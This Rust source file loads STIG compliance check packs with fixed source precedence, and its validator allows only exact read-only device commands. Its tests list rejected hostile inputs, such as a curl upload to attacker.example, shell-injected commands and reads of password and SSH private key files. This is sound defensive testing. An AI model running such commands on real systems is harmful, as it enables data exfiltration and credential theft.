//! Check-pack loading with deterministic source precedence.

use serde::de::DeserializeOwned;
use std::collections::HashSet;
#[cfg(test)]
use std::path::Path;

use crate::checks::{Check, CheckDefinition, CheckPack, CheckPlatform};
use crate::library::StigLibrary;

#[derive(rust_embed::Embed)]
#[folder = "../../content/check_packs"]
#[include = "*.json"]
struct EmbeddedCheckPacks;

#[derive(Debug, Default)]
pub struct CheckPackRegistry {
    packs: Vec<CheckPack>,
    embedded_loaded: bool,
}

impl CheckPackRegistry {
    pub fn new() -> Self {
        Self::default()
    }

    /// Test-only raw filesystem loader. Production library content must pass
    /// through `load_from_trusted_library_directory`.
    #[cfg(test)]
    fn load_from_directory_with_priority(
        &mut self,
        dir: &Path,
        base_priority: i32,
    ) -> crate::Result<usize> {
        if !dir.exists() {
            return Ok(0);
        }

        let mut paths = Vec::new();
        for entry in std::fs::read_dir(dir)? {
            let path = entry?.path();
            if path.is_file()
                && matches!(
                    path.extension().and_then(|value| value.to_str()),
                    Some("json" | "yaml" | "yml")
                )
            {
                paths.push(path);
            }
        }
        paths.sort();

        for path in &paths {
            let content = std::fs::read_to_string(path)?;
            let pack: CheckPack = match path.extension().and_then(|value| value.to_str()) {
                Some("json") => parse(&content)?,
                Some("yaml" | "yml") => serde_norway::from_str(&content)
                    .map_err(|error| crate::Error::Other(error.to_string()))?,
                _ => unreachable!(),
            };
            self.register_pack(pack, base_priority)?;
        }
        Ok(paths.len())
    }

    /// Load library executable content through its retained signed-manifest
    /// proofs. This is the only filesystem loader suitable for production
    /// evaluation. The supplied public keys are the current trust anchors.
    pub fn load_from_trusted_library_directory(
        &mut self,
        library: &StigLibrary,
        directory: &str,
        base_priority: i32,
        trusted_public_keys: &[[u8; 32]],
    ) -> crate::Result<usize> {
        let files = library.load_trusted_executable_files(directory, trusted_public_keys)?;
        for file in &files {
            let content = std::str::from_utf8(&file.bytes).map_err(|error| {
                crate::Error::Other(format!(
                    "trusted check pack {} is not UTF-8: {error}",
                    file.relative_path.display()
                ))
            })?;
            let pack: CheckPack = match file
                .relative_path
                .extension()
                .and_then(|value| value.to_str())
            {
                Some("json") => parse(content)?,
                Some("yaml" | "yml") => serde_norway::from_str(content)
                    .map_err(|error| crate::Error::Other(error.to_string()))?,
                _ => unreachable!("trusted executable loader filters extensions"),
            };
            self.register_pack(pack, base_priority)?;
        }
        Ok(files.len())
    }

    fn register_pack(&mut self, mut pack: CheckPack, base_priority: i32) -> crate::Result<()> {
        validate_pack(&pack)?;
        if let Some(existing) = self
            .packs
            .iter()
            .find(|existing| existing.stig_id == pack.stig_id)
        {
            if existing.platform != pack.platform {
                return Err(crate::Error::Other(format!(
                    "check pack {} platform {:?} conflicts with installed baseline {:?}",
                    pack.stig_id, pack.platform, existing.platform
                )));
            }
        }
        // Source tier is assigned by the trusted caller. Untrusted pack
        // metadata must never cross tiers or outrank curated content.
        pack.priority = base_priority;
        self.packs.push(pack);
        Ok(())
    }

    /// Register check packs compiled into the binary unless a filesystem pack
    /// was already registered. Filesystem content for the same STIG must never
    /// suppress the reviewed, embedded baseline.
    pub fn load_embedded(&mut self) -> crate::Result<usize> {
        if self.embedded_loaded {
            return Ok(0);
        }
        let mut paths: Vec<_> = EmbeddedCheckPacks::iter().collect();
        paths.sort();
        let mut embedded = Vec::with_capacity(paths.len());
        for path in paths {
            let content = EmbeddedCheckPacks::get(path.as_ref()).ok_or_else(|| {
                crate::Error::Other(format!("embedded check pack is missing: {path}"))
            })?;
            let mut pack: CheckPack = serde_json::from_slice(content.data.as_ref())?;
            validate_pack(&pack)?;
            // Curated embedded rules always win same-vulnerability conflicts;
            // custom/generated packs may add only non-overlapping behavior.
            pack.priority = 0;
            embedded.push(pack);
        }
        let count = embedded.len();
        self.packs.extend(embedded);
        self.embedded_loaded = true;
        Ok(count)
    }

    pub fn check_packs_for_stig(&self, stig_id: &str) -> Vec<&CheckPack> {
        let mut packs: Vec<_> = self
            .packs
            .iter()
            .filter(|pack| pack.stig_id == stig_id)
            .collect();
        packs.sort_by_key(|pack| pack.priority);
        packs
    }

    /// Return only packs whose declared release exactly matches the imported
    /// benchmark release. STIG IDs are not stable evaluation semantics across
    /// releases.
    pub fn check_packs_for_stig_release(&self, stig_id: &str, release: &str) -> Vec<&CheckPack> {
        self.check_packs_for_stig(stig_id)
            .into_iter()
            .filter(|pack| pack.version == release)
            .collect()
    }

    pub fn checks_for_stig_release(&self, stig_id: &str, release: &str) -> Vec<&CheckDefinition> {
        self.check_packs_for_stig_release(stig_id, release)
            .into_iter()
            .flat_map(|pack| pack.checks.iter())
            .collect()
    }
}

fn parse<T: DeserializeOwned>(content: &str) -> crate::Result<T> {
    serde_json::from_str(content).map_err(Into::into)
}

/// Validate a check pack at every executable-content ingress boundary.
pub fn validate_pack(pack: &CheckPack) -> crate::Result<()> {
    if pack.stig_id.trim().is_empty() {
        return Err(crate::Error::Other(
            "check pack STIG ID must not be empty".to_string(),
        ));
    }
    let (expected_platform, expected_release) =
        supported_pack_contract(&pack.stig_id).ok_or_else(|| {
            crate::Error::Other(format!(
                "check pack {} is outside the v0.3 supported-target contract",
                pack.stig_id
            ))
        })?;
    if pack.platform != expected_platform {
        return Err(crate::Error::Other(format!(
            "check pack {} must use platform {:?}, got {:?}",
            pack.stig_id, expected_platform, pack.platform
        )));
    }
    if pack.version != expected_release {
        return Err(crate::Error::Other(format!(
            "check pack {} must target release {}, got {}",
            pack.stig_id, expected_release, pack.version
        )));
    }
    let mut vuln_ids = HashSet::new();
    for definition in &pack.checks {
        if definition.vuln_id.trim().is_empty() {
            return Err(crate::Error::Other(format!(
                "check pack {} contains an empty vulnerability ID",
                pack.stig_id
            )));
        }
        if definition.platform != pack.platform {
            return Err(crate::Error::Other(format!(
                "check {} platform {:?} does not match pack {} platform {:?}",
                definition.vuln_id, definition.platform, pack.stig_id, pack.platform
            )));
        }
        if !vuln_ids.insert(&definition.vuln_id) {
            return Err(crate::Error::Other(format!(
                "check pack {} contains duplicate vulnerability ID {}",
                pack.stig_id, definition.vuln_id
            )));
        }
        validate_check_capabilities(pack.platform, &definition.check).map_err(|error| {
            crate::Error::Other(format!(
                "check pack {} rule {} is not read-only: {error}",
                pack.stig_id, definition.vuln_id
            ))
        })?;
        validate_expected(&definition.expected).map_err(|error| {
            crate::Error::Other(format!(
                "check pack {} rule {} has an invalid expected result: {error}",
                pack.stig_id, definition.vuln_id
            ))
        })?;
    }
    Ok(())
}

fn supported_pack_contract(stig_id: &str) -> Option<(CheckPlatform, &'static str)> {
    match stig_id {
        "NetApp_ONTAP_DSC_9-x_STIG" => Some((CheckPlatform::Ontap, "V2R2")),
        "General_Purpose_Operating_System" => Some((CheckPlatform::Bsd, "V3R3")),
        "Cisco_IOS-XE_Router_NDM_STIG" => Some((CheckPlatform::CiscoIos, "V3R7")),
        _ => None,
    }
}

fn validate_expected(expected: &crate::checks::ExpectedResult) -> Result<(), String> {
    use crate::checks::ExpectedResult;
    match expected {
        ExpectedResult::Matches { pattern } => validate_nonempty_regex(pattern),
        ExpectedResult::MatchCountAtLeast { pattern, min } => {
            if *min == 0 {
                return Err("match_count_at_least.min must be greater than zero".to_string());
            }
            validate_nonempty_regex(pattern)
        }
        ExpectedResult::NotContains { substring } => {
            if substring.trim().is_empty() {
                Err("not_contains substring must not be empty".to_string())
            } else {
                Ok(())
            }
        }
        ExpectedResult::IsTrue => Ok(()),
    }
}

fn validate_nonempty_regex(pattern: &str) -> Result<(), String> {
    if pattern.trim().is_empty() {
        return Err("regex pattern must not be empty".to_string());
    }
    let regex = regex::Regex::new(pattern).map_err(|error| format!("invalid regex: {error}"))?;
    if regex.is_match("") {
        return Err("regex must not match empty input".to_string());
    }
    Ok(())
}

fn validate_check_capabilities(platform: CheckPlatform, check: &Check) -> Result<(), String> {
    match check {
        Check::Command {
            command,
            pattern,
            is_regex,
        } if matches!(platform, CheckPlatform::Ontap | CheckPlatform::Bsd) => {
            validate_read_only_command(platform, command)?;
            if let Some(pattern) = pattern {
                if pattern.trim().is_empty() {
                    return Err("command predicate must not be empty".to_string());
                }
                if *is_regex {
                    validate_nonempty_regex(pattern)?;
                }
            }
            Ok(())
        }
        Check::Command { .. } => {
            Err("raw command checks are supported only for ONTAP and FreeBSD".to_string())
        }
        Check::ConfigLine {
            pattern, context, ..
        } if platform == CheckPlatform::CiscoIos => {
            if pattern.trim().is_empty() {
                return Err("configuration-line pattern must not be empty".to_string());
            }
            if context
                .as_ref()
                .is_some_and(|value| value.trim().is_empty())
            {
                return Err("configuration-line context must not be empty".to_string());
            }
            Ok(())
        }
        Check::ConfigLine { .. } => {
            Err("configuration-line checks are supported only for Cisco IOS-XE".to_string())
        }
        Check::All { checks } | Check::Any { checks } => {
            if checks.is_empty() {
                return Err("compound checks must not be empty".to_string());
            }
            for nested in checks {
                validate_check_capabilities(platform, nested)?;
            }
            Ok(())
        }
    }
}

/// Raw commands are an executable-content boundary. Permit only exact,
/// read-only command grammars used by reviewed packs. An executable allowlist
/// alone is insufficient: several inspection tools also expose mutating
/// subcommands or assignment forms.
pub(crate) fn validate_read_only_command(
    platform: CheckPlatform,
    command: &str,
) -> Result<(), String> {
    let command = command.trim();
    if command.is_empty()
        || command.chars().any(|character| {
            character.is_control()
                || !(character.is_ascii_alphanumeric()
                    || matches!(
                        character,
                        ' ' | '/' | '.' | '_' | '-' | ':' | ',' | '@' | '%'
                    ))
        })
    {
        return Err("raw command contains shell control or expansion syntax".into());
    }

    let tokens: Vec<&str> = command.split_whitespace().collect();
    let first = tokens.first().copied().unwrap_or_default();
    let allowed = match platform {
        CheckPlatform::Ontap => APPROVED_ONTAP_COMMANDS.contains(&command),
        CheckPlatform::Bsd => APPROVED_FREEBSD_COMMANDS.contains(&command),
        CheckPlatform::CiscoIos => false,
    };
    if !allowed {
        return Err(format!(
            "program or device command is not approved: {first}"
        ));
    }
    Ok(())
}

const APPROVED_ONTAP_COMMANDS: &[&str] = &[
    "cluster log-forwarding show",
    "cluster time-service ntp server show",
    "security config show",
    "security login role config show -role admin -fields passwd-alphanum",
    "security login role config show -role admin -fields passwd-min-lowercase-chars",
    "security login role config show -role admin -fields passwd-min-special-chars",
    "security login role config show -role admin -fields passwd-min-uppercase-chars",
    "security login role config show -role admin -fields passwd-minlength",
    "security login show -authentication-method domain",
    "security login show -role admin -authentication-method domain",
    "security login show -role admin -authentication-method password",
    "security session limit show -interface cli",
    "system timeout show",
    "vserver audit show -fields audit-guarantee",
];

const APPROVED_FREEBSD_COMMANDS: &[&str] = &[
    "cat /var/db/zoneinfo",
    "service auditd onestatus",
    "sysctl kern.elf64.aslr.enable",
];

#[cfg(test)]
mod tests {
    use super::*;
    use crate::checks::{Check, CheckPlatform, ExpectedResult};

    #[test]
    fn embedded_packs_load_once() {
        let mut registry = CheckPackRegistry::new();
        assert!(registry.load_embedded().unwrap() > 0);
        assert_eq!(registry.load_embedded().unwrap(), 0);
    }

    #[test]
    fn filesystem_priorities_are_deterministic() {
        let dir = tempfile::TempDir::new().unwrap();
        let pack = CheckPack {
            stig_id: "General_Purpose_Operating_System".to_string(),
            platform: CheckPlatform::Bsd,
            version: "V3R3".to_string(),
            priority: 100,
            checks: vec![CheckDefinition {
                vuln_id: "V-1".to_string(),
                platform: CheckPlatform::Bsd,
                check: Check::Command {
                    command: "sysctl kern.elf64.aslr.enable".to_string(),
                    pattern: None,
                    is_regex: false,
                },
                expected: ExpectedResult::Matches {
                    pattern: r"(?m)^kern\.elf64\.aslr\.enable:\s*1\s*$".to_string(),
                },
                description: None,
            }],
        };
        std::fs::write(
            dir.path().join("test.json"),
            serde_json::to_vec(&pack).unwrap(),
        )
        .unwrap();
        let mut registry = CheckPackRegistry::new();
        registry
            .load_from_directory_with_priority(dir.path(), 20)
            .unwrap();
        assert_eq!(
            registry.check_packs_for_stig("General_Purpose_Operating_System")[0].priority,
            20
        );
    }

    #[test]
    fn filesystem_pack_cannot_suppress_same_stig_embedded_baseline() {
        let dir = tempfile::TempDir::new().unwrap();
        let pack = CheckPack {
            stig_id: "NetApp_ONTAP_DSC_9-x_STIG".to_string(),
            platform: CheckPlatform::Ontap,
            version: "V2R2".to_string(),
            priority: 100,
            checks: vec![CheckDefinition {
                vuln_id: "V-246923".to_string(),
                platform: CheckPlatform::Ontap,
                check: Check::Command {
                    command: "system timeout show".to_string(),
                    pattern: None,
                    is_regex: false,
                },
                expected: ExpectedResult::Matches {
                    pattern: "^malicious-timeout$".to_string(),
                },
                description: None,
            }],
        };
        std::fs::write(
            dir.path().join("ontap.json"),
            serde_json::to_vec(&pack).unwrap(),
        )
        .unwrap();

        let mut registry = CheckPackRegistry::new();
        registry
            .load_from_directory_with_priority(dir.path(), 20)
            .unwrap();
        assert!(registry.load_embedded().unwrap() > 0);

        let ontap = registry.check_packs_for_stig("NetApp_ONTAP_DSC_9-x_STIG");
        assert_eq!(ontap.len(), 2);
        assert_eq!(ontap[0].priority, 0);
        assert_eq!(ontap[1].priority, 20);
        let curated = ontap[0]
            .checks
            .iter()
            .find(|check| check.vuln_id == "V-246923")
            .unwrap();
        assert!(matches!(
            &curated.expected,
            ExpectedResult::Matches { pattern } if pattern != "^malicious-timeout$"
        ));
    }

    #[test]
    fn wrong_platform_same_stig_pack_is_rejected_without_suppressing_baseline() {
        let dir = tempfile::TempDir::new().unwrap();
        let pack = CheckPack {
            stig_id: "NetApp_ONTAP_DSC_9-x_STIG".to_string(),
            platform: CheckPlatform::Bsd,
            version: "V2R2".to_string(),
            priority: 100,
            checks: vec![CheckDefinition {
                vuln_id: "V-WRONG".to_string(),
                platform: CheckPlatform::Bsd,
                check: Check::Command {
                    command: "cat /etc/ntp.conf".to_string(),
                    pattern: None,
                    is_regex: false,
                },
                expected: ExpectedResult::IsTrue,
                description: None,
            }],
        };
        std::fs::write(
            dir.path().join("wrong.json"),
            serde_json::to_vec(&pack).unwrap(),
        )
        .unwrap();

        let mut registry = CheckPackRegistry::new();
        registry.load_embedded().unwrap();
        assert!(registry
            .load_from_directory_with_priority(dir.path(), 900)
            .is_err());
        let ontap = registry.check_packs_for_stig("NetApp_ONTAP_DSC_9-x_STIG");
        assert_eq!(ontap.len(), 1);
        assert_eq!(ontap[0].platform, CheckPlatform::Ontap);
        assert!(ontap[0]
            .checks
            .iter()
            .all(|check| check.vuln_id != "V-WRONG"));
    }

    #[test]
    fn raw_commands_reject_mutation_network_and_shell_execution() {
        for command in [
            "curl https://attacker.example/upload",
            "cat /etc/passwd; reboot",
            "cat $(id)",
            "show running-config | tee bootflash:copy",
            "service sshd restart",
            "pkg install x",
            "sysctl kern.foo=1",
            "FOO=bar cat /etc/ntp.conf",
            "cat /etc/login.conf",
            "cat /etc/motd.template /etc/motd",
            "cat /etc/ntp.conf",
            "cat /etc/pam.d/passwd",
            "cat /etc/rc.conf",
            "cat /etc/security/audit_control",
            "cat /etc/ssh/sshd_config",
            "freebsd-version -k",
            "cat /etc/master.passwd",
            "cat /etc/ssh/ssh_host_ed25519_key",
            "cat /etc/rc.conf /etc/master.passwd",
            "freebsd-version -k extra",
        ] {
            assert!(validate_read_only_command(CheckPlatform::Bsd, command).is_err());
        }
        for command in [
            "security login show -role admin modify",
            "security login modify -role admin",
            "system timeout show; system timeout modify 0",
            "system timeout show -fields timeout modify 0",
        ] {
            assert!(validate_read_only_command(CheckPlatform::Ontap, command).is_err());
        }
        assert!(
            validate_read_only_command(CheckPlatform::Bsd, "sysctl kern.elf64.aslr.enable").is_ok()
        );
        assert!(validate_read_only_command(
            CheckPlatform::Ontap,
            "security login role config show -role admin -fields passwd-minlength"
        )
        .is_ok());
    }

    #[test]
    fn ontap_unprovable_requirements_are_not_executable() {
        let mut registry = CheckPackRegistry::new();
        registry.load_embedded().unwrap();
        let pack = registry
            .check_packs_for_stig_release("NetApp_ONTAP_DSC_9-x_STIG", "V2R2")
            .into_iter()
            .next()
            .unwrap();
        for vuln_id in [
            "V-246925", "V-246931", "V-246932", "V-246938", "V-246944", "V-246948",
        ] {
            assert!(
                pack.checks.iter().all(|check| check.vuln_id != vuln_id),
                "{vuln_id} must remain manual until sufficient evidence exists"
            );
        }
        for command in [
            "cluster date show",
            "security login banner show",
            "security login role config show -role admin -instance",
            "system configuration backup show",
        ] {
            assert!(
                validate_read_only_command(CheckPlatform::Ontap, command).is_err(),
                "manual-only command remained executable: {command}"
            );
        }
    }

    #[test]
    fn invalid_check_pack_is_not_silently_skipped() {
        let dir = tempfile::TempDir::new().unwrap();
        std::fs::write(dir.path().join("bad.json"), b"not json").unwrap();
        let mut registry = CheckPackRegistry::new();
        assert!(registry
            .load_from_directory_with_priority(dir.path(), 20)
            .is_err());
    }

    #[test]
    fn semantic_pack_errors_are_rejected() {
        let mut pack = CheckPack {
            stig_id: "General_Purpose_Operating_System".to_string(),
            platform: CheckPlatform::Bsd,
            version: "V3R3".to_string(),
            priority: 100,
            checks: vec![CheckDefinition {
                vuln_id: "V-1".to_string(),
                platform: CheckPlatform::Ontap,
                check: Check::Command {
                    command: "sysctl kern.elf64.aslr.enable".to_string(),
                    pattern: None,
                    is_regex: false,
                },
                expected: ExpectedResult::Matches {
                    pattern: r"(?m)^kern\.elf64\.aslr\.enable:\s*1\s*$".to_string(),
                },
                description: None,
            }],
        };
        assert!(validate_pack(&pack).is_err());

        pack.checks[0].platform = CheckPlatform::Bsd;
        pack.checks.push(pack.checks[0].clone());
        assert!(validate_pack(&pack).is_err());
    }

    #[test]
    fn executable_pack_boundary_rejects_scope_release_and_trivial_predicates() {
        let definition = CheckDefinition {
            vuln_id: "V-TEST".to_string(),
            platform: CheckPlatform::Bsd,
            check: Check::Command {
                command: "sysctl kern.elf64.aslr.enable".to_string(),
                pattern: None,
                is_regex: false,
            },
            expected: ExpectedResult::Matches {
                pattern: r"(?m)^kern\.elf64\.aslr\.enable:\s*1\s*$".to_string(),
            },
            description: None,
        };
        let mut pack = CheckPack {
            stig_id: "General_Purpose_Operating_System".to_string(),
            platform: CheckPlatform::Bsd,
            version: "V3R3".to_string(),
            priority: -100,
            checks: vec![definition],
        };
        assert!(validate_pack(&pack).is_ok());

        pack.stig_id = "Unsupported_STIG".to_string();
        assert!(validate_pack(&pack).is_err());
        pack.stig_id = "General_Purpose_Operating_System".to_string();
        pack.version = "V3R2".to_string();
        assert!(validate_pack(&pack).is_err());
        pack.version = "V3R3".to_string();

        pack.checks[0].expected = ExpectedResult::Matches {
            pattern: "[".to_string(),
        };
        assert!(validate_pack(&pack).is_err());
        pack.checks[0].expected = ExpectedResult::Matches {
            pattern: ".*".to_string(),
        };
        assert!(validate_pack(&pack).is_err());
        pack.checks[0].expected = ExpectedResult::MatchCountAtLeast {
            pattern: "x".to_string(),
            min: 0,
        };
        assert!(validate_pack(&pack).is_err());
        pack.checks[0].expected = ExpectedResult::NotContains {
            substring: " ".to_string(),
        };
        assert!(validate_pack(&pack).is_err());
        pack.checks[0].expected = ExpectedResult::IsTrue;
        if let Check::Command { pattern, .. } = &mut pack.checks[0].check {
            *pattern = Some(String::new());
        }
        assert!(validate_pack(&pack).is_err());

        let cisco = CheckPack {
            stig_id: "Cisco_IOS-XE_Router_NDM_STIG".to_string(),
            platform: CheckPlatform::CiscoIos,
            version: "V3R7".to_string(),
            priority: 100,
            checks: vec![CheckDefinition {
                vuln_id: "V-TEST".to_string(),
                platform: CheckPlatform::CiscoIos,
                check: Check::ConfigLine {
                    pattern: " ".to_string(),
                    context: None,
                    should_exist: false,
                },
                expected: ExpectedResult::IsTrue,
                description: None,
            }],
        };
        assert!(validate_pack(&cisco).is_err());
    }

    #[test]
    fn unknown_executable_pack_fields_are_rejected() {
        let dir = tempfile::TempDir::new().unwrap();
        std::fs::write(
            dir.path().join("unknown.json"),
            br#"{
              "stig_id":"General_Purpose_Operating_System",
              "platform":"bsd",
              "version":"V3R3",
              "priority":100,
              "checks":[],
              "allow_mutation":true
            }"#,
        )
        .unwrap();
        let mut registry = CheckPackRegistry::new();
        assert!(registry
            .load_from_directory_with_priority(dir.path(), 20)
            .is_err());
    }

    #[test]
    fn release_selection_fails_closed() {
        let mut registry = CheckPackRegistry::new();
        registry.load_embedded().unwrap();
        assert!(!registry
            .check_packs_for_stig_release("NetApp_ONTAP_DSC_9-x_STIG", "V2R2")
            .is_empty());
        assert!(registry
            .check_packs_for_stig_release("NetApp_ONTAP_DSC_9-x_STIG", "V2R3")
            .is_empty());
    }
}
